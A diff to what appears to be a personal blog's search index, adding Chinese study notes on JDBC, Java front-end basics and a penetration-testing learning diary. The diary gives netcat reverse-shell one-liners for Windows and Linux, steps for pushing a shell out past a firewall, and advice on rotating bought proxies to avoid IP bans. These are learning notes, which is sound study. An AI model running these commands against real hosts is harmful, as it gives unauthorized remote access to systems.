@@ -472,8 +472,75 @@
       </tags>
   </entry>
   <entry>
-    <title>java学习历程记录-前端</title>
-    <url>/2023/11/21/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
+    <title>java学习历程记录-JavaWeb</title>
+    <url>/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-JavaWeb/</url>
+    <content><![CDATA[<p>最近开始了java的巩固学习，想着就是对着黑马去学习，首先学习的就是javaweb这个模块，所以也就去记录一些学习的历程。</p>
+<span id="more"></span>
+
+<h1 id="一、JDBC的使用"><a href="#一、JDBC的使用" class="headerlink" title="一、JDBC的使用"></a>一、JDBC的使用</h1><h2 id="1、JDBC是什么"><a href="#1、JDBC是什么" class="headerlink" title="1、JDBC是什么"></a>1、JDBC是什么</h2><p>JDBC就是去使用Java语言操作关系型数据库的一套API，从而达到去操作不同的各种数据库。</p>
+<p>java中并没有各种数据库的实现类，只有查询语句，而实现类是各个数据库厂家提供的jar包中实现的，这样就保证了JDBC能够实现对多种数据库的兼容性。</p>
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>JavaWeb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透测试学习之路</title>
+    <url>/2023/11/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
+    <content><![CDATA[<p>已经决定了准备暑假看看去找个实习，对于web手来说，渗透肯定是必不可少的，所以从现在开始，也要抓紧时间去好好学下渗透的相关知识了。</p>
+<span id="more"></span>
+
+<h1 id="1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过"><a href="#1、第1天：基础入门-操作系统-名词-文件下载-反弹SHELL-防火墙绕过" class="headerlink" title="1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过"></a>1、第1天：基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹SHELL&amp;防火墙绕过</h1><blockquote>
+<p>一些参考的资料工具网站</p>
+<p>渗透常见术语<a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
+<p>渗透中下载：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
+<p>反弹shell：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p>
+<p>常见命令：<a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
+</blockquote>
+<h2 id="1、内网与外网的区别"><a href="#1、内网与外网的区别" class="headerlink" title="1、内网与外网的区别"></a>1、内网与外网的区别</h2><p>外网就是正常我们使用的服务器那种的，我们可以直接通过ip地址去访问，而内网则是在一小范围中使用的，无法直接通过其ip地址去直接找到，这个时候我们只能通过建立通道或者端口指定从而去指定到我们需要访问的内网，就比如虚拟机的ip，就相当于一个内网地址。</p>
+<h2 id="2、出网和进网"><a href="#2、出网和进网" class="headerlink" title="2、出网和进网"></a>2、出网和进网</h2><p>Windows的防火墙对于出网限制很少，而对于进网则有着很大的限制。</p>
+<p>所以在一般情况下，我们使用带有防火墙的主机去将cmd权限发出，使用没有防火墙的主机去连接，防火墙这样就不会起到阻拦的作用了。</p>
+<h2 id="3、反弹shell"><a href="#3、反弹shell" class="headerlink" title="3、反弹shell"></a>3、反弹shell</h2><blockquote>
+<p>Windows：nc -e cmd ip port</p>
+<p>Linux:   nc -e &#x2F;bin&#x2F;bash ip port</p>
+</blockquote>
+<p>内网可以连接外网，外网无法去连接内网。</p>
+<h2 id="4、实战"><a href="#4、实战" class="headerlink" title="4、实战"></a>4、实战</h2><p>①将cmd上传至目标服务器</p>
+<p>②将cmd权限发出，并使用外网主机接受</p>
+<p>③拿到权限，从而去完成渗透</p>
+<h1 id="2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器"></a>2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</h1><h2 id="1、网站的开发"><a href="#1、网站的开发" class="headerlink" title="1、网站的开发"></a>1、网站的开发</h2><p>这里也就是一些基础的web知识了，学会去购买服务器，域名等，并且以此去搭建一个自己的博客项目，这样也能去更好的理解一下网站的结构等相关知识。在这里就不过多的去讲解了，这都可以自己跟着网上的资料去学习的。</p>
+<h2 id="2、web应用框架"><a href="#2、web应用框架" class="headerlink" title="2、web应用框架"></a>2、web应用框架</h2><p>理解不同WEB应用组成角色功能架构：</p>
+<p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等。</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png" alt="image-20231129155607968"></p>
+<h2 id="3、代理以及抓包"><a href="#3、代理以及抓包" class="headerlink" title="3、代理以及抓包"></a>3、代理以及抓包</h2><p>可以使用bp去实现抓到请求包，并且去修改从而达到我们想要的效果。</p>
+<p>然后就是可以根据响应包的状态码去判断状态。</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png" alt="image-20231129155736090"></p>
+<h2 id="4、代理购买的作用"><a href="#4、代理购买的作用" class="headerlink" title="4、代理购买的作用"></a>4、代理购买的作用</h2><p>在网上去购买代理，就可以实现每次点击网站使用的就是不同的ip地址，这样就能去防止自身的ip被拉入黑名单后无法访问的问题。购买代理就像是在主机和被访问服务器之间新增了一个代理服务器，由这个服务器把你的请求拦截并由它发出，最后接收到的返回包也由它经手返回</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java学习历程记录-SpringMVC</title>
+    <url>/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-SpringMVC/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java学习历程记录-前端基础</title>
+    <url>/2023/11/21/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>其实java是之前一段时间学习的，但是学到一半的时候发现我的python能力不行，所以又转去学python了，然后又由于我之前没有记笔记的习惯，就导致我现在再回来看java，就基本上忘光了，所以想着借着写博客的功夫去将我的一些java学习历程记录下来，也能去好好的复习一下之前的知识。所以这篇文章并不主要是为了入门，更多的只是我自己的一个学习记录，仅限参考。</p>
 <span id="more"></span>
 
@@ -1458,10 +1525,12 @@
 <p>到这就差不多了这篇，主要就是对java中一些简单的前端知识进行总结。</p>
 ]]></content>
       <categories>
-        <category>java</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>java</tag>
+        <tag>html</tag>
+        <tag>css</tag>
+        <tag>js</tag>
       </tags>
   </entry>
 </search>
